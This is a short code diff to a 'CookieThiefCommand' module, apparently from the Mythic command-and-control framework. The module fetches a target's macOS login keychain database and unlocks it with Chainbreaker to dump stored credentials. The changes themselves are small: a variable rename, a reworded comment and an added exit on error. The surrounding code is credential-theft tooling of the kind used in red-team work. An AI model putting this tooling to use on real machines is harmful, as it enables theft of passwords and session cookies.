@@ -65,7 +65,7 @@ class CookieThiefCommand(CommandBase):
         pass
 
     async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
-        k_password = task.args.get_arg("password")
+        password = task.args.get_arg("password")
         getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id,filename="login.keychain-db", limit_by_callback=True, max_results=1, get_contents=True)
         if getkeychainDBResp.status == "success":
             getkeychainDBResp = getkeychainDBResp.response[0]
@@ -83,7 +83,7 @@ class CookieThiefCommand(CommandBase):
 
 
         try:
-            keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=k_password, unlock_key=None,
+            keychain = Chainbreaker("/Mythic/mythic/tmp_login.keychain-db", unlock_password=password, unlock_key=None,
                                     unlock_file=None)
 
             keychainoutput = []
@@ -98,10 +98,12 @@ class CookieThiefCommand(CommandBase):
                 }
             )
 
+
         except Exception as e:
-            #print("Chainbreaker script failed to dump passwords with error: " + str(e))
+            #print("Chainbreaker script failed with error: " + str(e))
             traceback.print_exc()
             sys.stdout.flush()
+            sys.exit(1)
 
         try:
             for record_collection in keychainoutput:
